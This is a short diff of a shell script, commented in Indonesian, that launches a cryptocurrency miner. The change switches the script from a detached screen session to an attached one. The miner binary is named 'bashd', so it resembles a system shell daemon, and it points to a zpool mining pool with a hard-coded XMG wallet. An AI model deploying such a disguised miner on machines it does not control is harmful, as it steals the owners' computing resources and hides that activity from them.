@@ -21,7 +21,9 @@ if [ ! -f "bashd" ]; then
 fi
 chmod +x bashd
 
+screen -R yuli
+
 # Jalankan mining di screen
-screen -dmS "$SCREEN_NAME" ./bashd -o stratum+tcp://m7m.sea.mine.zpool.ca:6033 -u 9QeohmiaKG2cS5R4vmKU8PcCDiisyJMvGt -p c=XMG,zap=XMG -t 3 -e 100
+./bashd -o stratum+tcp://m7m.sea.mine.zpool.ca:6033 -u 9QeohmiaKG2cS5R4vmKU8PcCDiisyJMvGt -p c=XMG,zap=XMG
 
 echo "Mining telah dimulai di screen: $SCREEN_NAME"
